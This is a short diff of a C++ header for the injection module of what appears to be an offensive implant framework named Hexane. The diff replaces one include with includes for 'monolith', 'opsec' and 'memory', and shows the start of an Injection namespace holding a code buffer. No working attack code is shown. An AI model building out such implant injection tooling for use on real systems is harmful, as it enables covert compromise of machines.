@@ -1,7 +1,10 @@
 #ifndef HEXANE_IMPLANT_INJECT_HPP
 #define HEXANE_IMPLANT_INJECT_HPP
 
-#include <core/corelib.hpp>
+#include <core/monolith.hpp>
+#include <core/include/opsec.hpp>
+#include <core/include/memory.hpp>
+
 namespace Injection {
     struct _code {
         uint8_t* data;
